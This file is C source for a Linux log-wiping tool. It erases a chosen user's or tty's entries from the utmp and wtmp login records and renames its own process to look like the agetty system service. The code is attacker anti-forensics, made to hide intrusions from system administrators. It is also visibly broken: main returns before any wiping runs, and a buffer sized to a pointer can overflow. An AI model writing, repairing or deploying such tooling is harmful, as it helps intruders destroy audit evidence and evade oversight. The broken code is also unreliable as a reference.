/*
wtmp and utmp cleaner for linux systems

removes the target user from wtmp and utmp

~ iadnah, based on someone else's code (don't remember who); I added the ability to
  pick what user to do it to and added the rudimentary proc_hiding

*/
#include <utmp.h>
#include <stdio.h>
#include <sys/file.h>
#include <sys/fcntl.h>
#define utmp_LOCATION "/var/run/utmp"
#define WTMP_LOCATION "/var/log/wtmp"
#define FNAME  "/sbin/agetty 38400 tty1 linux"

int clear_wtmp();
int clear_utmp();

int clear_utmp(target) {
   struct utmp utmp;
   int size, fd, lastone = 0;
   int tty = 0, x = 0;
   fd = open(utmp_LOCATION,O_RDWR);
   if (fd >= 0) {
	   size = read(fd, &utmp, sizeof(struct utmp));
	   while ( size == sizeof(struct utmp) )
	   {
		   if ( tty ? ( !strcmp(utmp.ut_line, target) ) : ( !strcmp(utmp.ut_name, target) ) ) {
		   	lseek( fd, -sizeof(struct utmp), L_INCR );
		   	bzero( &utmp, sizeof(struct utmp) );
		   	write( fd, &utmp, sizeof(struct utmp) );
		   }
		   size = read( fd, &utmp, sizeof(struct utmp) );
	   }
   }
   else {
	return 4;   
   }

   close(fd); 
}

int main(argc, argv)
int argc;
char **argv;
{
	char target[sizeof(argv[1])+1];
	strcpy(target, argv[1]);

	char *p;
	for (p = argv[0]; *p; p++)
	*p = 0;
	strcpy(argv[0], FNAME);


	return 0;

	if ( clear_utmp(target) != 4 ) {
		printf("Successfully wiped from utmp.\n");
	}
	else {
		printf("Editing of utmp failed.\n");
	}
	
	clear_wtmp(target);

	return 0;
}

int clear_wtmp(target) {
    struct utmp utmp;
    int size, fd, lastone = 0;
    int tty = 0, x = 0, y = 0;

    if (!strncmp(target,"tty",3)) { tty++; }

    if ((fd = open(WTMP_LOCATION, O_RDWR))==-1) {
        printf("Error: Open on %s\n", WTMP_LOCATION);
        exit(1);
    }

    printf("[Searching for %s]:  ", target);

    if (fd >= 0)
    {
       size = read(fd, &utmp, sizeof(struct utmp));
       while ( size == sizeof(struct utmp) )
       {
          if ( tty ? ( !strcmp(utmp.ut_line, target) ) :
            ( !strncmp(utmp.ut_name, target, strlen(target)) ) &&
              lastone != 1)
          {
             y = 1 + x;
             if (x==10)
                printf("\b%d", y);
             else
             if (x>9 && x!=10)
                printf("\b\b%d", y);
             else
                printf("\b%d", y);
             	lseek( fd, -sizeof(struct utmp), L_INCR );
             	bzero( &utmp, sizeof(struct utmp) );
             	write( fd, &utmp, sizeof(struct utmp) );
             	x++;
          }
          size = read( fd, &utmp, sizeof(struct utmp) );
       }
    }
    if (!x)
       printf("No entries found.");
    else
       printf(" entries removed.");
    printf("\n");
    close(fd);
}
